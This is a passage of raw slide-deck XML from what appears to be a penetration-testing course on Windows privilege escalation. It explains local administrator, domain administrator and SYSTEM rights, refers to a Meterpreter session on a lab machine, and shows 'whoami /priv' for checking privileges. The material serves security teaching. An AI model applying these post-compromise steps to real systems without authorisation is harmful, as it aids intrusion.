                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="85000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Domain administrators</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="91425" marB="548625" marR="91425" marL="91425" anchor="b">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43461"/>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90" name="Shape 790"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="791" name="Google Shape;791;p95"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="792" name="Google Shape;792;p95"/>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793" name="Google Shape;793;p95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8813400" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>local administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> in Windows is a high-privilege role that also allows high access </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>to the operating system. The user may access any folder or files and modify the permissions on them.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="794" name="Google Shape;794;p95"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598838" y="1662650"/>
            <a:ext cx="5067225" cy="2885775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="795" name="Google Shape;795;p95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="97750" y="1624625"/>
            <a:ext cx="3316500" cy="30000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2"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The user tstark, under whose name we have a Meterpreter session on the WIN10 machine, is a local administrator to the WIN10 machine.</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-323850" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>tstark is only a local administrator, not a domain administrator, meaning they</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>do not have administrative rights on any machines on</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>the network aside from this</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>WIN10 machine.</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>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96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3145536" y="1400800"/>
            <a:ext cx="5555100" cy="13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But the Administrators group in Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>does not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>confer the highest privileges possible. </a:t>
            </a:r>
            <a:endParaRPr>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4" name="Shape 804"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="805" name="Google Shape;805;p97"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="806" name="Google Shape;806;p97"/>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807" name="Google Shape;807;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="473925" y="828375"/>
            <a:ext cx="3920700" cy="12021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1" lang="en" sz="1600">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Modification of the system’s configuration files, for example, requires SYSTEM privileges, which is the Windows equivalent of root in Linux.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1600">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="808" name="Google Shape;808;p97"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4903143" y="328300"/>
            <a:ext cx="3920675" cy="4486899"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="809" name="Google Shape;809;p97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="159019" y="2051611"/>
            <a:ext cx="3920700" cy="2561700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="457200" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-193040" lvl="0" marL="91440" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>While a user can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>assigned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> to the Administrators group in Windows, there is no group for SYSTEM.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-193040" lvl="0" marL="91440" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>SYSTEM is technically the </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>computer account.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-193040" lvl="0" marL="91440" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Computer accounts always have </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>full access to their own machine.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>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3" name="Shape 813"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="814" name="Google Shape;814;p98"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="815" name="Google Shape;815;p98"/>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816" name="Google Shape;816;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8368200" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Upon gaining access to a Windows machine, the first thing a penetration tester should do is check their privileges. In Windows, we can accomplish </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>this in a few ways.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="817" name="Google Shape;817;p98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="434875" y="1747875"/>
            <a:ext cx="2936400" cy="2699100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Method 1:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>In PowerShell or cmd, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:highlight>
                  <a:schemeClr val="accent2"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>will give the name of the user you are logged in as.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800"/>
            </a:br>
            <a:br>
              <a:rPr lang="en" sz="1800"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>The command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:highlight>
                  <a:schemeClr val="accent2"/>
                </a:highlight>
                <a:latin typeface="Inconsolata SemiBold"/>
                <a:ea typeface="Inconsolata SemiBold"/>
                <a:cs typeface="Inconsolata SemiBold"/>
                <a:sym typeface="Inconsolata SemiBold"/>
              </a:rPr>
              <a:t>whoami /priv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>will </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> the permissions the user has.</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="818" name="Google Shape;818;p98"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3579450" y="1645405"/>
            <a:ext cx="5228050" cy="28155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22" name="Shape 822"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="823" name="Google Shape;823;p9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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="824" name="Google Shape;824;p99"/>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825" name="Google Shape;825;p99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="664550"/>
            <a:ext cx="3257700" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
